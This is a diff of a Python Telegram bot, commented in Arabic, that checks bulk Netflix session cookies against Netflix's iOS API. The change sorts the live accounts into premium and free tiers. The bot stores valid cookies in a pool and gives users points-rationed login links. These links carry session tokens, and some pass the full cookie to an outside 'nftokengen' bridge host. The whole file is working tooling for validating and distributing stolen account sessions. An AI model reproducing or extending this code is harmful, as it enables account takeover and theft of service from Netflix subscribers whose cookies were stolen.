@@ -18,7 +18,6 @@ bot = telebot.TeleBot(TOKEN)
 # 👑 إعدادات المطور الخاصة بك (فارس)
 DEVELOPER_CHAT_ID = 8713916851
 DEVELOPER_USERNAME = "farxxes" 
-# الرابط المحدث لقناتك
 CHANNEL_LINK = "https://t.me/farxxess"
 
 # تعطيل تحذيرات SSL
@@ -30,11 +29,11 @@ if not os.path.exists(BASE_TEMP_DIR):
     os.makedirs(BASE_TEMP_DIR)
 
 # --- قواعد البيانات المؤقتة في الذاكرة ---
-VALID_COOKIES_POOL = []      # مخزن الكوكيز الشغالة
-USED_COOKIES_HISTORY = set() # فلتر منع التكرار
-USER_DATABASE = {}           # {user_id: {"points": 5, "username": "", "role": "MEMBER"}}
-BANNED_USERS = set()         # قائمة الحظر
-active_scans = {}            # تتبع الفحص النشط
+VALID_COOKIES_POOL = []      
+USED_COOKIES_HISTORY = set() 
+USER_DATABASE = {}           
+BANNED_USERS = set()         
+active_scans = {}            
 
 API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 QUERY_PARAMS = {
@@ -98,18 +97,24 @@ def check_netflix_cookie_detailed(netflix_id):
             expires = account_info.get("expires")
             
             if token:
-                membership_status = value_data.get("membershipStatus", "UNKNOWN")
-                is_on_hold = value_data.get("accountHold", False) or value_data.get("isInHoldStatus", False)
-                geoblock_status = value_data.get("geoBlockStatus", {})
+                # استخراج معلومات الباقة لتصنيف الحساب (Premium أم Free/Basic)
+                plan_info = value_data.get("currentPlan", {}) or value_data.get("plan", {})
+                plan_name = str(plan_info).lower()
                 
-                # التحقق الصارم من أن الحساب نشط وليس منتهي أو مجمد
-                if membership_status in ["ACTIVE", "CURRENT_MEMBER"] and not is_on_hold and not geoblock_status.get("isBlocked", False):
-                    return {"token": token, "expires": expires, "bypass": False}
-        
-        # إلغاء الاعتماد على الـ Fallback الضعيف الذي يقبل الحسابات المنتهية
+                is_premium = True
+                if "basic" in plan_name or "free" in plan_name or "ads" in plan_name:
+                    is_premium = False
+
+                return {
+                    "token": token, 
+                    "expires": expires, 
+                    "bypass": False, 
+                    "is_premium": is_premium
+                }
         return None
     except Exception:
         return None
+
 def auto_clean_pool_job():
     global VALID_COOKIES_POOL
     while True:
@@ -148,29 +153,47 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
     
     live_accounts_accumulator = []
     stop_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 إيقاف الفحص", callback_data=f"stop_scan_{chat_id}"))
-    status = bot.send_message(chat_id, f"⏳ جاري فحص واستخراج الكوكيز...\n\n(تم العثور على {total_count} كوكيز وجاري المعالجة...)", reply_to_message_id=reply_to_message_id, reply_markup=stop_markup)
     
-    live_count, dead_count, dup_count = 0, 0, 0
+    # رسالة الحالة الابتدائية
+    initial_status_text = (
+        f"⚡ **Processing Progress**\n\n"
+        f"Total Cookies: {total_count}\n"
+        f"Mode: FullInfo\n"
+        f"Filter: All accounts\n\n"
+        f"Current Status:\n"
+        f"[░░░░░░░░░░░░░░░░░░░░] 0%\n\n"
+        f"🔍 Processing: 0/{total_count}\n"
+        f"✅ Valid: 0\n"
+        f"👑 Premium: 0\n"
+        f"👤 Free/Basic: 0\n"
+        f"❌ Invalid: 0\n"
+    )
+    status = bot.send_message(chat_id, initial_status_text, reply_to_message_id=reply_to_message_id, reply_markup=stop_markup)
+    
+    valid_count, premium_count, free_count, dead_count, dup_count = 0, 0, 0, 0, 0
 
     for index, netflix_id in enumerate(netflix_ids, start=1):
         if not active_scans.get(chat_id, False):
-            safe_send_message(chat_id, f"🛑 تم إلغاء الفحص!\n✅ شغال: {live_count} | ❌ ميت: {dead_count} | ✂️ مكرر: {dup_count}")
+            safe_send_message(chat_id, f"🛑 تم إلغاء الفحص بواسطة المستخدم!")
             return
 
         is_duplicate = netflix_id in USED_COOKIES_HISTORY
 
-        if index % 5 == 0 or index == total_count:
-            try:
-                bot.edit_message_text(f"⏳ جاري الفحص: ({index}/{total_count})\n✅ شغال: {live_count} | ❌ ميت: {dead_count} | ✂️ مكرر: {dup_count}", chat_id, status.message_id, reply_markup=stop_markup)
-            except Exception:
-                pass
+        # حساب النسبة المئوية وشريط التقدم
+        progress_pct = int((index / total_count) * 100)
+        progress_bar = "█" * int(progress_pct / 5) + "░" * (20 - int(progress_pct / 5))
 
         result = check_netflix_cookie_detailed(netflix_id)
         if result:
+            valid_count += 1
+            if result["is_premium"]:
+                premium_count += 1
+            else:
+                free_count += 1
+
             if is_duplicate:
                 dup_count += 1
             else:
-                live_count += 1
                 USED_COOKIES_HISTORY.add(netflix_id)
                 if netflix_id not in VALID_COOKIES_POOL:
                     VALID_COOKIES_POOL.append(netflix_id)
@@ -186,24 +209,41 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
             encoded_cookie = urllib.parse.quote(full_cookie_string)
             bridge_login_url = f"https://nftokengen-7ik6.onrender.com/nf/netflix?cookie={encoded_cookie}"
             
-            dup_tag = " (مكرر شغال)" if is_duplicate else ""
-            res_text = f"🌟 **PREMIUM ACCOUNT{dup_tag}** 🌟\n\n📁 المصدر: {clean_source_name}\n• انتهاء الفواتير: {date_str}\n\n🔗 الرابط المباشر:\n{direct_netflix_url}"
+            acc_type_label = "👑 PREMIUM ACCOUNT" if result["is_premium"] else "👤 FREE/BASIC ACCOUNT"
+            res_text = f"🌟 **{acc_type_label}** 🌟\n\n📁 المصدر: {clean_source_name}\n• انتهاء الفواتير: {date_str}\n\n🔗 الرابط المباشر:\n{direct_netflix_url}"
             txt_entry = f"Cookie: {full_cookie_string}\nURL: {direct_netflix_url}\n====================\n\n"
             live_accounts_accumulator.append(txt_entry)
             
             markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💻 PC Login", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
             safe_send_message(chat_id, res_text, markup)
-            time.sleep(1.2)
+            time.sleep(1.0)
         else:
-            if is_duplicate:
-                USED_COOKIES_HISTORY.discard(netflix_id)
-                if netflix_id in VALID_COOKIES_POOL:
-                    VALID_COOKIES_POOL.remove(netflix_id)
             dead_count += 1
+
+        # تحديث واجهة التقدم كل حسابين أو عند النهاية لتجنب ضغط الـ API
+        if index % 2 == 0 or index == total_count:
+            try:
+                live_status_text = (
+                    f"⚡ **Processing Progress**\n\n"
+                    f"Total Cookies: {total_count}\n"
+                    f"Mode: FullInfo\n"
+                    f"Filter: All accounts\n\n"
+                    f"Current Status:\n"
+                    f"[{progress_bar}] {progress_pct}%\n\n"
+                    f"🔍 Processing: {index}/{total_count}\n"
+                    f"✅ Valid: {valid_count}\n"
+                    f"👑 Premium: {premium_count}\n"
+                    f"👤 Free/Basic: {free_count}\n"
+                    f"❌ Invalid: {dead_count}\n"
+                )
+                bot.edit_message_text(live_status_text, chat_id, status.message_id, reply_markup=stop_markup)
+            except Exception:
+                pass
+
         time.sleep(0.1)
 
     active_scans.pop(chat_id, None)
-    safe_send_message(chat_id, f"📊 **اكتمل الفحص والتصفية!**\n\n✅ المضاف للمخزن الجديد: {live_count}\n❌ التالف: {dead_count}\n✂️ المكرر الشغال المرسل: {dup_count}\n\n🪙 رصيدك الحالي: {USER_DATABASE[chat_id]['points']} نقطة 🪙")
+    safe_send_message(chat_id, f"📊 **اكتمل الفحص والتصفية بنجاح!**\n\n✅ الصالح: {valid_count}\n👑 البريميوم: {premium_count}\n👤 العادي/فري: {free_count}\n❌ التالف: {dead_count}\n\n🪙 رصيدك الحالي: {USER_DATABASE[chat_id]['points']} نقطة 🪙")
     if live_accounts_accumulator: 
         send_txt_file(chat_id, live_accounts_accumulator, source_name)
 
@@ -367,12 +407,12 @@ def execute_dispense_logic(chat_id):
             direct_netflix_url = "https://www.netflix.com/" if fresh_result["bypass"] else f"https://netflix.com/?nftoken={token}"
             short_id = current_cookie[:20]
             
-            points_display = "♾️ وضع المطور" if chat_id == DEVELOPER_CHAT_ID else ("💎 رتبة VIP" if role == "VIP" else f"{USER_DATABASE[chat_id]['points']} نقطة")
+            points_display = "♾️ وضع المطور" if chat_id == DEVELOPER_CHAT_ID else ("💎 وضع VIP" if role == "VIP" else f"{USER_DATABASE[chat_id]['points']} نقطة")
             success_text = (
-                f"🎉 **تفدّل رابط نتفلكس الطازج الخاص بك** 🎉\n\n"
+                f"🎉 **تفضل رابط نتفلكس الطازج الخاص بك** 🎉\n\n"
                 f"🪙 رصيدك المتبقي الحالي: {points_display}.\n"
                 f"📅 **تاريخ الفواتير القادم:** {date_str}\n\n"
-                f"🔗 **رابط الدخول المباشر الموقت:**\n{direct_netflix_url}\n\n"
+                f"🔗 **رابط الدخول المباشر المؤقت:**\n{direct_netflix_url}\n\n"
                 f"🤔 **هل اشتغل معك الرابط بدون مشاكل؟** يرجى التقييم بالأسفل 👇"
             )
             
